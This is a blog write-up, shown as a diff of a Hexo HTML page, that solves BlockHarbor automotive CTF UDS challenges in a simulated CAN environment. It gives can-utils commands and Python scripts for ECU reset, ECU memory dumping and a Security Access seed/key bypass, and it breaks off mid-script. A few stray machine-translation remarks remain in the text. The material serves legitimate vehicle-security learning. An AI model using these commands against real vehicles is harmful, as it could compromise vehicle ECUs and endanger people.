+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2025-11-20 19:00" pubdate>
+      2025년 11월 20일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.7k 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      74
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[Research] Understanding CAN / UDS Vulnerabilities through BlockHarbor CTF and CVEs (EN)</h1>
+                       
+            <div class="markdown-body" id="post-body">
+              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              <!-- hackyboiz_horizen_index -->
+              <!--
+              <ins class="adsbygoogle"
+                   style="display:block"
+                   data-ad-client="ca-pub-3672652207808168"
+                   data-ad-slot="8887862313"
+                   data-ad-format="auto"
+                   data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              -->
+              <p>Hello! I am newp1ayer48 from Hackyboiz, responsible for the low-level area! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p>
+<p><img src="image01.jpg" srcset="/img/loading.gif" alt="image01.jpg"></p>
+<p>In the automotive field, a communication protocol that is frequently used and applied is CAN communication. Security vulnerabilities can also occur in this CAN communication! Many CTFs and competitions are also being held targeting the automotive sector (Defcon also has a Car Hacking Village).</p>
+<p>In this article, we&#x2019;ll solve a problem from the BlockHarbor CTF, one of the most famous CTFs for vehicle hacking, to learn about vehicle communication and the resulting security vulnerabilities!</p>
+<h2 id="1-CAN-Bus-amp-UDS"><a href="#1-CAN-Bus-amp-UDS" class="headerlink" title="1. CAN Bus &amp; UDS"></a>1. CAN Bus &amp; UDS</h2><p><img src="image02.png" srcset="/img/loading.gif" alt="[image02.png](https://t-shaped-person.tistory.com/51)"></p>
+<p>CAN (Controller Area Network) communication is a protocol developed for communication between devices within a vehicle, such as ECUs (Electronic Control Units). It uses a message-based, low-level network communication system in a non-host bus manner. Since it was developed in 1983, it predates the HTTP protocol! A basic CAN message consists of 8 Bytes, and the extended version, CAN-FD (Flexible Data-rate), can represent data up to 64 Bytes.</p>
+<p>Furthermore, the international standard for CAN communication is specified by ISO 15765.</p>
+<p><img src="image03.png" srcset="/img/loading.gif" alt="[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)"></p>
+<p>UDS stands for Unified Diagnostic Services, and you&#x2019;ll frequently encounter this term when dealing with vehicle CTFs and CAN communication. It is a protocol used for diagnostic communication, primarily employed with ECUs. Since it is a higher-level protocol than the low-level CAN protocol, it allows for various functions such as data Read/Write (R/W).</p>
+<p>The international standard for the UDS message structure operating over CAN communication was designated by ISO 15765.</p>
+<p>Since knowing the UDS message structure is crucial for the BlockHarbor CTF challenge we are about to solve, let&#x2019;s briefly look at it. The UDS message is structured as shown in the picture above. A simple explanation of each part is as follows:</p>
+<ul>
+<li>CAN ID: The ECU that will transmit or receive the message.</li>
+<li>PCI (Protocol Control Information): Primarily used for the length of the UDS message, Flow Control, etc.</li>
+<li>SID (Service Identifier): Identifies the requested service.<ul>
+<li>Sub Function Byte: Detailed options for the SID.</li>
+</ul>
+</li>
+<li>DID (Data Identifier): Identifies the data being accessed.</li>
+</ul>
+<p>Now, I will explain some of the more important items among these.</p>
+<p><img src="image04.png" srcset="/img/loading.gif" alt="image04.png"></p>
+<p>The CAN ID values for each ECU are set as hexadecimal values according to ISO 15765-4.</p>
+<ul>
+<li><code>7DF</code> is primarily the identifier used for broadcasting to all ECUs or for internal functions/settings to be delivered to an ECU.</li>
+<li>For transmission, the CAN IDs are designated as <code>7E0</code> for ECU 1, <code>7E1</code> for ECU 2, and so on.</li>
+<li>For reception, the ID is designated as the transmission value <code>+ 0x8</code>.</li>
+</ul>
+<p>The SID (Service Identifier) can simply be described as the identifier that signals what action (service) will be performed. Since the SID values are also standardized, you can directly check the SID value corresponding to a service through the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">document</a>. The corresponding Response SID (RSID) value is the request SID value <code>+ 0x40</code>. If the RSID, which is the response to the requested SID, is successfully received, it indicates that the communication was successful.</p>
+<p>Additionally, there are commands among the SIDs that include a Sub Function Byte. This is used to designate a more detailed service request when an SID is requested. It is optional and may or may not be used, which can be confirmed by checking the documentation.</p>
+<p>The DID (Data Identifier) is the identifier that refers to the data. Many DID values are also reserved according to the ISO-14229 standard, so you can check the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">document</a> to find the appropriate DID value. The most representative example of a DID is the VIN (Vehicle Identification Number) value, which is <code>F190</code>. If you request this DID value along with an SID, the service corresponding to the SID will be executed targeting the VIN.</p>
+<p>In the case of SIDs that use the Sub Function Byte, which we just explained, there are instances where a DID may not be necessary.</p>
+<p>When solving the upcoming BlockHarbor CTF problems, it is absolutely essential to keep the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">SID</a> and <a target="_blank" rel="external nofollow noopener noreferrer" href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> documentation pages open and look up the commands as you go!</p>
+<h3 id="1-1-CAN-Utils"><a href="#1-1-CAN-Utils" class="headerlink" title="1.1. CAN Utils"></a>1.1. CAN Utils</h3><p><img src="image05.jpg" srcset="/img/loading.gif" alt="image05.jpg"></p>
+<p>To transmit and receive CAN/UDS messages, you can use the can-utils tool. This tool is based on SocketCAN, which implements the CAN protocol on Linux. I&#x2019;ll explain this using the example shown below.</p>
+<pre><code class="hljs bash">candump -a vcan0,7E0:7FF</code></pre>
+<p><code>candump</code> is a tool that allows you to receive CAN/UDS messages. By specifying the desired CAN network interface, you can receive CAN messages from that interface. In the example above , the <code>-a</code> option was added to show the ASCII results along with the CAN message, and masking arguments <code>7E0</code> and <code>7FF</code> were added to receive data only from ECU 1.</p>
+<p>When solving the CTF problems later, this command will be frequently used on one terminal to run and check the responses.</p>
+<pre><code class="hljs bash">cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre>
+<p><code>cansend</code> is a tool that allows you to transmit CAN/UDS messages. Similarly, it can send a CAN message to the desired CAN network interface. For the upcoming problems, you will need to construct the message by properly configuring the SID and DID according to the UDS format explained earlier and then transmit it.</p>
+<p>Additionally, for cases where the response data is larger than the basic CAN message length of 8 Bytes, a commonly used technique is to send a Flow Control request, such as <code>30000000</code>, along with the message to ensure all data is received.</p>
+<p>By using <code>cansend</code> to transmit a message and then confirming the response data with <code>candump</code>, you can verify the entire CAN/UDS communication process.</p>
+<h2 id="2-Blockharbor-CTF"><a href="#2-Blockharbor-CTF" class="headerlink" title="2. Blockharbor CTF"></a>2. Blockharbor CTF</h2><p><img src="image06.jpg" srcset="/img/loading.gif" alt="image06.jpg"></p>
+<p>BlockHarbor CTF is an Automotive Capture the Flag (CTF) competition created by the automotive cybersecurity company, Block Harbor. It is highly recommended for solving vehicle hacking problems because it provides a virtual CAN interface environment and a simulation environment for communication between ECUs, making it convenient for hands-on practice with CAN/UDS commands.</p>
+<p>The site is broadly composed of two parts: the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://proving-grounds.blockharbor.io/">CTF Problem Site</a>, which is built on the CTFd platform, and the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a> site, which establishes the vehicle simulation environment. If you are new to CAN/UDS and vehicle systems, it is recommended that you start with the &#x201C;Getting Started&#x201D; problems on the CTF problem site.</p>
+<p><img src="image07.png" srcset="/img/loading.gif" alt="image07.png"></p>
+<p>When you connect to <a target="_blank" rel="external nofollow noopener noreferrer" href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a>, navigate to Other - Learn - SIMULATIONS. By clicking the terminal icon on the right side of Proving Grounds, you can access the vehicle simulation environment&#x2019;s terminal via the web in various environments. Since we will be solving the UDS Challenge problems, we will connect to the UDS Challenge terminal. If you are solving different problems, you can connect to another simulation terminal and use the environment appropriate for that problem.</p>
+<p><img src="image08.png" srcset="/img/loading.gif" alt="image08.png"></p>
+<p>When you connect via the terminal icon, you will access a tmux shell like the one shown above. You can solve the CTF problems you&#x2019;ve identified within this environment.</p>
+<h3 id="2-1-tmux-setting"><a href="#2-1-tmux-setting" class="headerlink" title="2.1 tmux setting"></a>2.1 tmux setting</h3><p>To use the tmux terminal environment, you can configure a better problem-solving setup with a few tmux commands and settings. BlockHarbor itself has created a basic <a target="_blank" rel="external nofollow noopener noreferrer" href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux introduction</a> via their landing page. I will explain a few of the frequently used commands from that guide.</p>
+<p><img src="image09.png" srcset="/img/loading.gif" alt="image09.png"></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># Terminal splitting</span>
+Ctrl + b
+%
+
+<span class="hljs-comment"># Terminal moving</span>
+Ctrl + b
+&#x2190; &#x2192;
+
+<span class="hljs-comment"># Terminal scroll</span>
+Ctrl + b
+[
+<span class="hljs-comment"># End scroll</span>
+Ctrl + c</code></pre>
+<p>You didn&#x2019;t provide the list of tmux commands, but based on your comment, here is the translation emphasizing the general idea:</p>
+<p>The commands and settings listed above are those that are frequently used in practice. Terminal splitting and navigation are used especially often. For additional settings or commands you may want, you can check the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux intro</a> or search online.</p>
+<h2 id="3-UDS-Challenge"><a href="#3-UDS-Challenge" class="headerlink" title="3. UDS Challenge"></a>3. UDS Challenge</h2><p><img src="image10.png" srcset="/img/loading.gif" alt="image10.png"></p>
+<p>The UDS Challenge problems we will solve are tackled by performing the actions required by the problem using UDS commands and controlling the vehicle environment. The <a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">SID</a> and <a target="_blank" rel="external nofollow noopener noreferrer" href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> used to solve the problems can be found in the documentation introduced earlier.</p>
+<p>Let&#x2019;s start solving the problems right away!</p>
+<h3 id="3-1-Simulation-VIN"><a href="#3-1-Simulation-VIN" class="headerlink" title="3.1. Simulation VIN"></a>3.1. Simulation VIN</h3><p><img src="image11.png" srcset="/img/loading.gif" alt="image11.png"></p>
+<p>This problem requires you to retrieve the VIN (Vehicle Identification Number) using UDS.</p>
+<p>The VIN is the Vehicle Identification Number, which was briefly discussed when explaining the commands earlier! The task is to query this value in the simulation environment.</p>
+<p><img src="image12.png" srcset="/img/loading.gif" alt="image12.png"></p>
+<p>The translation is:</p>
+<p>First, by checking the network interfaces in the simulation environment, you can confirm the virtual CAN interface, vcan0. You should target this interface when transmitting and receiving CAN/UDS messages.</p>
+<p><img src="image13.png" srcset="/img/loading.gif" alt="image13.png"></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+<span class="hljs-comment"># 03(PCI:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)</span>
+cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre>
+<p>To monitor the transmission and reception messages for the broadcast and ECU 1, I added masking for three CAN IDs in candump. Afterward, I combined the VIN DID and the Read Data By Identifier (SID) and transmitted the message. Since the response comes from ECU 1, by sending a Flow Control request to that ECU, the full VIN can be confirmed, and the flag can be identified!</p>
+<pre><code class="hljs angelscript">e66fb3f67ac3:~$ candump -a vcan0,<span class="hljs-number">7E0</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7E8</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7</span>DF:<span class="hljs-number">7</span>FF
+  vcan0  <span class="hljs-number">7</span>DF   [<span class="hljs-number">4</span>]  <span class="hljs-number">03</span> <span class="hljs-number">22</span> F1 <span class="hljs-number">90</span>               <span class="hljs-string">&apos;.&quot;..&apos;</span>
+  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">10</span> <span class="hljs-number">14</span> <span class="hljs-number">62</span> F1 <span class="hljs-number">90</span> <span class="hljs-number">66</span> <span class="hljs-number">6</span>C <span class="hljs-number">61</span>   <span class="hljs-string">&apos;..b..fla&apos;</span>
+  vcan0  <span class="hljs-number">7E0</span>   [<span class="hljs-number">4</span>]  <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>               <span class="hljs-string">&apos;0...&apos;</span>
+  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">21</span> <span class="hljs-number">67</span> <span class="hljs-number">7</span>B <span class="hljs-number">76</span> <span class="hljs-number">31</span> <span class="hljs-number">6</span>E <span class="hljs-number">5</span>F <span class="hljs-number">42</span>   <span class="hljs-string">&apos;!g{     &apos;</span>
+  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">22</span> <span class="hljs-number">48</span> <span class="hljs-number">6</span>D <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span> <span class="hljs-number">7</span>D   <span class="hljs-string">&apos;&quot;      }&apos;</span></code></pre>
+<p>Let&#x2019;s examine the received message in detail.</p>
+<p>Upon making the Read Data By Identifier request (<code>22</code>), we can confirm the correct RSID (<code>62</code>) response. Following this, a large amount of data is returned, and continuous values like <code>21</code> and <code>22</code> are indicated before these data packets. This confirms that the data is continuous (a multi-frame transfer). </p>
+<h3 id="3-2-Startup-Message"><a href="#3-2-Startup-Message" class="headerlink" title="3.2. Startup Message"></a>3.2. Startup Message</h3><p><img src="image14.png" srcset="/img/loading.gif" alt="image14.png"></p>
+<p>This problem asks about how to restart an ECU. It also states that the diagnostic information is broadcast using <code>7DF</code>.</p>
+<p><img src="image15.png" srcset="/img/loading.gif" alt="image15.png"></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+<span class="hljs-comment"># 02(PCI:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)</span>
+cansend vcan0 7DF<span class="hljs-comment">#021101</span></code></pre>
+<p>The simple way to Restart the ECU is to send a Reset request (<code>11</code>). For the Reset request used in this problem, we use the Default Session (<code>01</code>) Sub Function Byte. Because of this, no separate DID is used. </p>
+<p>When the ECU Reset request with the Default Session is transmitted, you can confirm the corresponding RSID response (<code>51</code>). Subsequently, you can also obtain the flag information!</p>
+<h3 id="3-3-Engine-Trouble"><a href="#3-3-Engine-Trouble" class="headerlink" title="3.3. Engine Trouble?"></a>3.3. Engine Trouble?</h3><p><img src="image16.png" srcset="/img/loading.gif" alt="image16.png"></p>
+<p>This problem requires reading the Diagnostic Trouble Codes (DTCs). You must authenticate the flag by matching the DTC format, which is typically <code>Pxxxx-xx</code>.</p>
+<p><img src="image17.png" srcset="/img/loading.gif" alt="image17.png"></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+<span class="hljs-comment"># 03(PCI:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)</span>
+cansend vcan0 7DF<span class="hljs-comment">#03190208</span></code></pre>
+<p>The problem can be solved by sending a Read DTC Information request (<code>19</code>). The DTC (Diagnostic Trouble Codes) can be viewed using a Status Mask. The detailed DTC Status Byte can be found in the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://buly.kr/2UjxlRq">AUTOSAR documentation</a>.</p>
+<p>The confirmed DTC is <code>P3E9F-01</code>. Since DTCs are used in OBD2 for vehicle diagnostics, you can refer to the corresponding standard, the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://piembsystech.com/iso-15031-protocol/">ISO 15031</a> document, to understand how to interpret the DTC code.</p>
+<h3 id="3-4-Secrets-in-Memory"><a href="#3-4-Secrets-in-Memory" class="headerlink" title="3.4. Secrets in Memory?"></a>3.4. Secrets in Memory?</h3><p><img src="image18.png" srcset="/img/loading.gif" alt="image18.png"></p>
+<p>This problem requires a Read Memory By Address request. The accessible memory area is stated to start from <code>0xC3F80000</code>.</p>
+<p><img src="image19.png" srcset="/img/loading.gif" alt="image19.png"></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+<span class="hljs-comment"># 07(PCI:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)</span>
+cansend vcan0 7DF<span class="hljs-comment">#072314C3F83000FF &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre>
+<p>Data in memory can be read using a memory read request (<code>23</code>).</p>
+<p>A point to note here is that you must calculate and use the value (<code>14</code>) corresponding to the AddressAndLengthFormatIdentifier (AALFId) before specifying the address. You can understand the explanation of AALFId by referring to <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.youtube.com/watch?v=s2uC4vWMU7Q&amp;t=104s">this video</a>. Consequently, reading is possible by sending a read request for 255 (<code>FF</code>) bytes using the value <code>14</code>, which requests the use of a 4-byte address and 1-byte length format.</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> struct
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>
+    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>
+    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)
+    <span class="hljs-keyword">return</span> can_id, data[:dlc]
+
+recvdata = <span class="hljs-string">&quot;&quot;</span>
+
+<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:
+    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))
+    p.settimeout(<span class="hljs-number">0.5</span>)
+
+    <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xC3F83000</span>, <span class="hljs-number">0xC3F865ff</span>, <span class="hljs-number">0xFF</span>):
+        req_data = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + addr.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>
+        p.send(build_can_frame(<span class="hljs-number">0x7DF</span>, req_data))
+
+        <span class="hljs-keyword">try</span>:
+            resp_frame = p.recv(<span class="hljs-number">16</span>)
+            resp_id, resp_data = dissect_can_frame(resp_frame)
+            <span class="hljs-keyword">if</span> resp_data:
+                recvdata += resp_data.hex()[<span class="hljs-number">6</span>:]
+        <span class="hljs-keyword">except</span> socket.timeout:
+            <span class="hljs-keyword">continue</span>
+
+        flow_control_data = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>
+        p.send(build_can_frame(<span class="hljs-number">0x7E0</span>, flow_control_data))
+
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">36</span>):
+            <span class="hljs-keyword">try</span>:
+                resp_frame = p.recv(<span class="hljs-number">16</span>)
+                _, resp_data = dissect_can_frame(resp_frame)
+                tempdata = resp_data.hex()[<span class="hljs-number">2</span>:]
+                <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:
+                    recvdata += tempdata
+            <span class="hljs-keyword">except</span> socket.timeout:
+                <span class="hljs-keyword">break</span>
+
+    hex_data_string = recvdata
+
+    <span class="hljs-keyword">try</span>:
+        byte_data = bytes.fromhex(hex_data_string)
+        ascii_string = byte_data.decode(<span class="hljs-string">&quot;ascii&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>)
+        print(ascii_string)
+        
+    <span class="hljs-keyword">except</span> ValueError:
+        print(<span class="hljs-string">&quot;error&quot;</span>)</code></pre>
+<p>Through the code above, data in the <code>0xC3F83000</code> range can be parsed.</p>
+<p>Although the Python <code>can</code> module is typically used for CAN communication, it is unavailable in a simulation environment&#x2026; Therefore, it was written using the <code>socket</code> module as a replacement.</p>
+<p>When representing the CAN format with the Python <code>socket</code> module, the argument <code>=IB3x8s</code> must be provided.</p>
+<p><img src="image20.png" srcset="/img/loading.gif" alt="image20.png"></p>
+<p>The flag present in memory can be confirmed by executing the code.</p>
+<h3 id="3-5-Security-Access-Level-3"><a href="#3-5-Security-Access-Level-3" class="headerlink" title="3.5. Security Access Level 3"></a>3.5. Security Access Level 3</h3><p><img src="image21.png" srcset="/img/loading.gif" alt="image21.png"></p>
+<p>This challenge requires identifying the cryptographic algorithm for Security Access Level 3 and finding the corresponding key for the seed value 0x1337. As described in the problem, the length of both the seed and the key for Level 3 is 2 bytes.</p>
+<p><img src="image22.png" srcset="/img/loading.gif" alt="[image22.png](https://blog.naver.com/suresofttech/223327497814)"></p>
+<p>First, let&#x2019;s look at the Security Access function provided by UDS.</p>
+<p>Security Access is a service that controls access rights to the ECU. It&#x2019;s helpful to think of higher numbers representing higher levels of authority. It is used with SID <code>27</code> after first changing to the Extended Diagnostic Session (<code>10</code> - <code>03</code>).</p>
+<p>A seed value is generated, and a key is created through an internal cryptographic algorithm. Communication is performed in a way that grants access if authentication with the corresponding key value is successful. A key point here is that only when sending the key value, the request must be made using the access level value being accessed plus 1.</p>
+<p><img src="image23.png" srcset="/img/loading.gif" alt="image23.png"></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+<span class="hljs-comment"># 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>
+cansend vcan0 7E0<span class="hljs-comment">#021003</span>
+
+<span class="hljs-comment"># 02(PCI:len) 27(SID:SecurityAccess) 03(Level)</span>
+cansend vcan0 7E0<span class="hljs-comment">#022703</span>
+
+<span class="hljs-comment"># 04(PCI:len) 27(SID:SecurityAccess) 04(Level+1) KEYS</span>
+cansend vcan0 7E0<span class="hljs-comment">#042704KEYS</span></code></pre>
+<p>Authentication for Level 3 can be performed according to the Security Access authentication sequence.</p>
+<p>First, after changing to the Extended Diagnostic Session (<code>1030</code>), the seed value <code>7E53</code> generated by the Security Access Level 3 request (<code>2703</code>) can be confirmed. Upon transmitting the corresponding key value, Security Access was successful, as confirmed by the Security Access RSID (<code>67</code>).</p>
+<p>The cryptographic algorithm used was a simple one that performs a bitwise inversion of the seed value. Therefore, the flag can be obtained as the result of <code>0x1337 ^ 0xFFFF</code>.</p>
+<pre><code class="hljs python"> <span class="hljs-comment"># security access level 3 pass</span>
+
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> struct
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>
+    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>
+    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)
+    <span class="hljs-keyword">return</span> can_id, data
+
+<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:
+    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))
+    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>
+    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)
+    p.send(frame1)
+
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        frame_r = p.recv(<span class="hljs-number">16</span>)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:
+            <span class="hljs-keyword">break</span>
+
+    data2 = <span class="hljs-string">b&quot;\x02\x27\x03\x00\x00\x00\x00\x00&quot;</span>
+    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)
+    p.send(frame2)
+
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        frame_r = p.recv(<span class="hljs-number">16</span>)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:
+            <span class="hljs-keyword">break</span>
+    seed = msg_data.hex()[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>]
+    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed}</span>&quot;</span>)
+    
+    key = <span class="hljs-string">f&quot;<span class="hljs-subst">{~int(seed, <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>:<span class="hljs-number">04</span>X}</span>&quot;</span>
+    print(<span class="hljs-string">f&quot;Keys: <span class="hljs-subst">{key}</span>&quot;</span>)
+    
+    key_bytes = int(key, <span class="hljs-number">16</span>).to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&apos;big&apos;</span>)
+    data3 = <span class="hljs-string">b&quot;\x04\x27\x04&quot;</span> + key_bytes + <span class="hljs-string">b&quot;\x00\x00\x00&quot;</span>
+    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)
+    p.send(frame3)
+
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
